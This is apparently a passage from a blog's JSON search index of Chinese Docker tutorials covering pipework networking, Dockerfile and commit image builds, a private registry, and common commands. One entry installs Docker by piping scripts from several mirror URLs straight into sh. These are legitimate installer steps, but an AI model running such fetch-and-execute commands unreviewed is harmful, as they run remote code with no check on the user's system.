run/start/attach）来启动容器。","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker-容器间通信","date":"2015-06-19T22:35:49.000Z","path":"virtualization/Docker-容器间通信/","text":"pipework https://github.com/jpetazzo/pipework 思路在同一宿主主机中创建两台容器，通过pipework创建网桥进行通讯 c1docker run –name c1 -it ubuntu:14.04 c2 docker run –name c2 -it ubuntu:14.04 创建网桥git clone https://github.com/jpetazzo/pipework.git 123➜ pipework git:(master) ./pipework br1 c1 192.168.11.1/24➜ pipework git:(master) ./pipework br1 c2 192.168.11.2/24 brctl show 效果图","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker构建镜像-Dockerfile","date":"2015-03-27T14:25:06.000Z","path":"virtualization/Docker构建镜像-Dockerfile/","text":"通过dockerfile构建镜像 Docker提供了一种标准化的DSL，你只需要编写一个Dockerfile，运行docker build指令，就可以构建自己的ImageDockerfile指令https://docs.docker.com/engine/reference/builder/ 1234567➜ DockerfileDemo cat DockerfileFROM debianRUN echo &quot;Hello docker!&quot;RUN apt-get update &amp;&amp; apt-get install -y \\nginxRUN echo &apos;Nginx install success&apos; &gt; /var/www/html/index.htmlEXPOSE 80 构建镜像123456789101112➜ DockerfileDemo docker build -t=&quot;debian/nginx:2&quot; .Sending build context to Docker daemon 2.048 kBStep 1 : FROM debian ---&gt; 1b01529cc499Step 2 : RUN echo &quot;Hello docker!&quot; ---&gt; Using cache ---&gt; 3791785c0268Step 3 : RUN apt-get update &amp;&amp; apt-get install -y nginx ---&gt; Using cache ---&gt; 47fcc445f762****************************************Successfully built 26eee4e7b4e4 查看构建成功后的镜像123➜ DockerfileDemo docker images debian/nginx:2REPOSITORY TAG IMAGE ID CREATED SIZEdebian/nginx 2 26eee4e7b4e4 6 minutes ago 196.4 MB 使用该 镜像创建容器-d 告诉容器以分离的方式在后台运行nginx -g “daemon off;” 以前台的方式启动Nginx，作为Web容器1234➜ ~ docker run -itd -p 80 debian/nginx:2 nginx -g &quot;daemon off;&quot;b329360da168141902fc623b71f5cc79540bdffad26b1802e504988925ffec54➜ ~ docker port b329360da168141902fc623b71f5cc79540bdffad26b1802e504988925ffec5480/tcp -&gt; 0.0.0.0:32769 推送镜像至仓库 以docker hub为例 1docker push r65q89/test 补充查看镜像构建历史123456789➜ ~ docker history debian/nginx:2IMAGE CREATED CREATED BY SIZE COMMENT26eee4e7b4e4 10 minutes ago /bin/sh -c #(nop) EXPOSE 80/tcp 0 B fe16089c6b6f 11 minutes ago /bin/sh -c echo 'Nginx install success' &gt; /va 22 B 5c40a6f4eee9 11 minutes ago /bin/sh -c service nginx start 3 B 47fcc445f762 12 minutes ago /bin/sh -c apt-get update &amp;&amp; apt-get install 71.29 MB 3791785c0268 17 minutes ago /bin/sh -c echo \"Hello docker!\" 0 B 1b01529cc499 3 weeks ago /bin/sh -c #(nop) CMD [\"/bin/bash\"] 0 B &lt;missing&gt; 3 weeks ago /bin/sh -c #(nop) ADD file:0e0565652aa852f620 125.1 MB 查看某容器端口映射情况1docker port 容器id 或者这样查看所有docker映射的端口","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker构建镜像-commit","date":"2015-03-22T13:23:26.000Z","path":"virtualization/Docker构建镜像-commit/","text":"docker commit 先创建一个容器，并在容器里做出修改,最后commit修改类似github的使用1234➜ ~ docker run -i -t --name test-docker-commit debian /bin/bashroot@8b20759d9e60:/#root@8b20759d9e60:/# apt-get -yqq updateroot@8b20759d9e60:/# apt-get -yqq install ipython commit修改 1234root@8b20759d9e60:/# exitexit➜ ~ docker commit test-docker-commit debian/ipythonsha256:dd7440e1f33791270b82010396b02b8522899619f9336bc998835733b988cd76 查看新创建的镜像 123➜ ~ docker images debian/ipythonREPOSITORY TAG IMAGE ID CREATED SIZEdebian/ipython latest dd7440e1f337 2 minutes ago 173.9 MB 可通过docker inspect查看镜像详细详细 12345678910111213141516➜ ~ docker inspect debian/ipython:v1[ &#123; \"Id\": \"sha256:05fc24b025ad3ad61a121785e53e7748cfd415b6fbb0aad630ae5844e4bd5607\", \"RepoTags\": [ \"debian/ipython:v1\" ], \"RepoDigests\": [], \"Parent\": \"sha256:1b01529cc499d51767c62f9fc8083043610546b4e050898809ec54e00dbb1a34\", \"Comment\": \"base image is debian\", \"Created\": \"2016-08-25T05:54:03.366052897Z\", \"Container\": \"8b20759d9e601a78a1baa8441238297e35a51c95b35fb17f3a1e6399cb540f1a\", \"ContainerConfig\": &#123; \"Hostname\": \"8b20759d9e60\", \"Domainname\": \"\",……………………………… docker commit 的一些参数 12345678910111213➜ ~ docker commit --helpUsage: docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]Create a new image from a container's changesOptions: -a, --author string Author (e.g., \"John Hannibal Smith &lt;hannibal@a-team.com&gt;\") -c, --change value Apply Dockerfile instruction to the created image (default []) --help Print usage -m, --message string Commit message -p, --pause Pause container during commit (default true)➜ ~","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker私有仓库","date":"2015-03-20T12:20:14.000Z","path":"virtualization/Docker私有仓库/","text":"搭建仓库 使用docker-registry进行私有仓库搭建 基于容器docker pull registry 12#运行容器并将镜像存储到宿主主机/opt/data/registry目录docker run -d -p 5000 -v /opt/data/registry:/tmp/registry /registry 测试 打开浏览器输入http://127.0.0.1:5000/v2 上传镜像 通过docker tag将该镜像标志为要推送到私有仓库 12docker tag sshd:dockerfile3 127.0.0.1:5000/sshddocker push 127.0.0.1:5000/sshd 拉取镜像1docker pull 127.0.0.1:5000/sshd","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker 笔记","date":"2015-03-18T07:16:01.000Z","path":"virtualization/Docker笔记/","text":"安装Docker Docker官方脚本1curl -sSL https://get.docker.com/ | sh 阿里云脚本 1curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh - DaoCloud脚本 1curl -sSL https://get.daocloud.io/docker | sh 常用操作退出正在运行的容器 不是终止 1先ctrl+p再ctrl+q 检查Docker服务是否运行1ps aux | grep docker 查找镜像 以kali为例1docker search kali 删除所有没有运行的容器1234567➜ ~ docker rm $(docker ps -a | grep Exited | awk &apos;&#123;print $1&#125;&apos;)bcb7eddb6e6fc9175726acaf115104b12746934a087667bd8b20759d9e60d484e3abffa1 修改镜像名字 before 1daocloud.io/library/ubuntu xenial-20160809 f8d79ba03c00 13 days ago 126.4 MB 改名1➜ ~ docker tag daocloud.io/library/ubuntu:xenial-20160809 ubuntu:latest 可以看到除了REPOSITORY和TAG 其他的都一样12daocloud.io/library/ubuntu xenial-20160809 f8d79ba03c00 13 days ago 126.4 MBubuntu latest f8d79ba03c00 13 days ago 126.4 MB 然后删除之前的别名 123➜ ~ docker rmi daocloud.io/library/ubuntu:xenial-20160809Untagged: daocloud.io/library/ubuntu:xenial-20160809Untagged: daocloud.io/library/ubuntu@sha256:746fa32ad3473c57c6a80b9addc1629937778b074b885dcdd9f3366250605850 设置docker开机启动 如果没设置docker服务开机启动的话，先运行命令chkconfig –add docker1在运行docker run的时候再加上命令 --restart=always 修改容器配置 对于已经在运行的容器，可通过如下命令进入容器中进行配置1docker exec -it $container_id /bin/bash 修改源1234567新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者 %programdata%\\docker\\config\\daemon.json（Windows） 来配置 Daemon。请在该配置文件中加入（没有该文件的话，请先建一个）：&#123; &quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125;","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]}]